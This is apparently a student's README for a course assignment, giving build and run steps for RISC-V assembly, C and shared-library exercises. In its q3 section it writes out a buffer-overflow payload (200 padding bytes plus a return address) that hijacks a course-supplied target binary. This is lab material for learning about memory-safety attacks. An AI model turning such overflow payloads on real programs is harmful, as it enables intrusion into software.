[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)


## How to run q1
1. cd to q1
2. Start a docker container
3. compile and run
```
riscv64-linux-gnu-gcc -static main.c q1.s -o q1
qemu-riscv64 ./q1
```


## Q-2 Next greater element
### How to run
1. you have to cd to q2
2. Start a container
   ```
   dockerrun -v $(pwd):/workspace -it riscv-dev 
   OR 
   docker run -it -v $(pwd):/workspace:Z riscv-dev 
   ```
3. compile the program
   ```
   riscv64-linux-gnu-gcc -nostdlib -static q2.s -o q2     #using -nostlib to
   ```
4. Run the program with input
   eg:
   ```
   qemu-riscv64-static ./q2 85 96 70 80 102
   ```

### how to run q3
#### part a
```
svinod@Sfedora:~/Documents/assignment-2-shevshev29/q3/a$ python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload.txt
```
```
svinod@Sfedora:~/Documents/assignment-2-shevshev29/q3/a$ ./target_shevshev29 < payload.txt
```
##### output expected
```
Sorry, try again.
You have passed!
Segmentation fault (core dumped)
```


#### part b
Run the below commands
```
riscv64-linux-gnu-objdump -d ./target_shevshev29 | grep -A 60 "<main>"
```
```
python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload
./target_shevshev29 < payload
```

##### output expected
```
Sorry, try again.
You have passed!
Segmentation fault (core dumped)
```

## Q-4 how to run:
1.  you have to cd to q4
2.  ```
    gcc -shared -fPIC addd.c -o libaddd.so
    gcc q4.c -ldl -o calc
    ./calc
    ```


###  How to run q5



